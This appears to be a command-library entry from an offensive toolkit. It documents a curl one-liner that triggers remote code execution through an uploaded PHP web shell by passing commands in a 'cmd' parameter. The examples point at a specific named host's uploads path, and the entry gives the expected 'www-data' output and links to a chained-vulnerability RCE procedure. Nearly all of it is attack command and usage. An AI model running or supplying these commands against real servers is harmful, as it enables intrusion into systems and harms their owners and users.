---
id: cmd-uuid-3
data: curl '$1?cmd=$2'
tags:
  - rce
  - execution
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:45.971Z'
verified: false
validated: true
submitted: true
---
# curl-rce-trigger

## Command

```bash
curl '$1?cmd=$2'
```

## Description

Triggers remote code execution on an uploaded web shell by appending a 'cmd' parameter to the file URL, where $1 is the shell URL and $2 is the command (e.g., 'whoami'). Used post-upload to verify and exploit RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$1` | URL of the uploaded shell file | Yes |
| `$2` | Command to execute on server | Yes |

## Examples

### Basic Usage

```bash
curl 'https://my.stripo.email/uploads/shell.php?cmd=whoami'
```

### Advanced Usage

```bash
curl 'https://my.stripo.email/uploads/shell.php?cmd=ls -la' -v
```

## Expected Output

Direct output of the command, e.g., 'uid=33(www-data) gid=33(www-data)' for whoami, indicating successful execution.

## Related

- [[Related Procedure|procedures/Achieve-Remote-Code-Execution-via-Chained-Vulns]]
